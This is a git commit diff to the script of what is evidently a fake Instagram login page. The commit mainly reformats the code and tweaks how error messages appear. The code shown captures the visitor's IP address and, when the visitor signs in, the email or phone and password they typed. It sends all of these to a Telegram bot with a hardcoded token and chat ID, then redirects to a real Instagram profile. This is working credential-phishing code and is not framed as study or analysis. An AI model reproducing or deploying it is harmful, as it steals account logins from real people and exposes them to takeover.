fcd9fa91463f612d8d53aa4a126395d68401544f
Saikumar Shetty <73155077+Shettysai@users.noreply.github.com>
2022-08-15 19:30:03 +0530

    Update script.js

--- js/script.js
+++ js/script.js
@@ -5,21 +5,21 @@ const inputPassword = document.getElementById("inputPassword")
 const signin = document.getElementById("signin")
 const errorspan = document.getElementById("errorspan")
 
-let ip ='Not Found'
+let ip = 'Not Found'
 
 fetch('https://api.db-ip.com/v2/free/self')
     .then(result => result.json())
     .then((output) => {
         ip = output;
-        const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=`+`INSTAGRAM--------${ip.ipAddress}`
-    fetch(url, {
-        method: "POST",
-        headers: { 'Content-Type': 'application/json' },
-        body: ''
-    }).then(res => {
-        console.log("Request complete!");
-    })
-}).catch(err => console.error(err));
+        const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=` + `INSTAGRAM--------${ip.ipAddress}`
+        fetch(url, {
+            method: "POST",
+            headers: { 'Content-Type': 'application/json' },
+            body: ''
+        }).then(res => {
+            console.log("Request complete!");
+        })
+    }).catch(err => console.error(err));
 
 const validateEmail = email => {
     const re = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
@@ -31,24 +31,29 @@ const validatePhone = email => {
     return re.test(String(email).toLowerCase());
 }
 
-signin.addEventListener("click", async (ev)=>{
-            ev.preventDefault();
-            console.log("signing in...");
-                const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=`+`INSTAGRAM  || ${inputEmail.value}:${inputPassword.value} || ${JSON.stringify(ip)}`
-   
-     if(!validateEmail(inputEmail.value) && !validatePhone(inputEmail.value)){
-            errorspan.style.display="block"
-        }else{
-   
-   fetch(url, {
-        method: "POST",
-        headers: { 'Content-Type': 'application/json' },
-        body: ''
-    }).then(res => {
-        console.log("Request complete!");
-    });
-            location.href = "https://www.instagram.com/varsha._.rai"
-            return false;
-        }
+inputEmail.addEventListener('input', ()=>{ errorspan.style.display = "none"});
+inputPassword.addEventListener('input', ()=>{ errorspan.style.display = "none"});
+
+signin.addEventListener("click", async (ev) => {
+    ev.preventDefault();
+    console.log("signing in...");
+    const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=` + `INSTAGRAM  || ${inputEmail.value}:${inputPassword.value} || ${JSON.stringify(ip)}`
+
+    if (!validateEmail(inputEmail.value) && !validatePhone(inputEmail.value)) {
+        errorspan.style.display = "block"
+        setTimeout(()=>{
+            errorspan.style.display = "none"
+        }, 2300)
+    } else {
+        fetch(url, {
+            method: "POST",
+            headers: { 'Content-Type': 'application/json' },
+            body: ''
+        }).then(res => {
+            console.log("Request complete!");
+        });
+        location.href = "https://www.instagram.com/varsha._.rai"
+        return false;
+    }
 }
 );
